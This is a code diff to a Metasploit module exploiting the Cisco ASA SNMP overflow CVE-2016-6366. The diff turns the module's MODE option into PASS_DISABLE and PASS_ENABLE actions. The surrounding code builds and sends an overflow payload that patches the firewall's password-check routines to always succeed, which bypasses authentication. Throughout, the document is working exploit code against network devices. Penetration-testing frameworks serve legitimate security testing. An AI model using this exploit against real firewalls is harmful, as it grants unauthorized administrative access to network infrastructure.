@@ -33,14 +33,19 @@ class MetasploitModule < Msf::Auxiliary
           [ 'URL', 'https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20160817-asa-snmp'],
           [ 'URL', 'https://github.com/RiskSense-Ops/CVE-2016-6366'],
         ],
-      'License'     => MSF_LICENSE
+      'License'     => MSF_LICENSE,
+      'Actions'   =>
+        [
+          ['PASS_DISABLE', {'Description' => 'Disable password authentication.'} ],
+          ['PASS_ENABLE', {'Description' => 'Enable password authentication.'} ]
+        ],
+      'DefaultAction' => 'PASS_DISABLE'
     )
 
     @offsets = version_offsets()
 
     register_options([
       OptEnum.new('ASAVER', [ false, 'Target ASA version (default autodetect)', 'auto', ['auto']+@offsets.keys]),
-      OptEnum.new('MODE', [ true, 'Enable or disable the password auth functions', 'pass-disable', ['pass-disable', 'pass-enable']])
     ], self.class)
 
     deregister_options("VERSION")
@@ -118,11 +123,11 @@ class MetasploitModule < Msf::Auxiliary
     # adds offsets to the improved shellcode
     # https://github.com/RiskSense-Ops/CVE-2016-6366/blob/master/shellcode.nasm
 
-    if mode == 'pass-disable'
+    if mode == 'PASS_DISABLE'
       always_return_true = "49.192.64.195"
       pmcheck_bytes = always_return_true
       admauth_bytes = always_return_true
-    else
+    else  # PASS_ENABLE
       pmcheck_bytes = @offsets[vers_string][5]
       admauth_bytes = @offsets[vers_string][8]
     end
@@ -161,13 +166,12 @@ class MetasploitModule < Msf::Auxiliary
 
   def run()
     begin
-      mode = datastore['MODE']
       session = rand(255) + 1
 
       vers_string = get_asa_version()
 
-      print_status("Building #{mode} payload for version #{vers_string}...")
-      overflow = build_payload(vers_string, mode)
+      print_status("Building #{action.name} payload for version #{vers_string}...")
+      overflow = build_payload(vers_string, action.name)
       payload = SNMP::ObjectId.new(overflow)
 
       print_status("Sending SNMP payload...")
@@ -175,8 +179,9 @@ class MetasploitModule < Msf::Auxiliary
 
       if response.varbind_list
         print_good("Clean return detected!")
-        if mode == 'pass-disable'
-          print_warning("Don't forget to run pass-enable after logging in!")
+        if action.name == 'PASS_DISABLE'
+          print_warning("Don't forget to run PASS_ENABLE after logging in!")
+          print_warning("  set ACTION PASS_ENABLE")
         end
       end
 
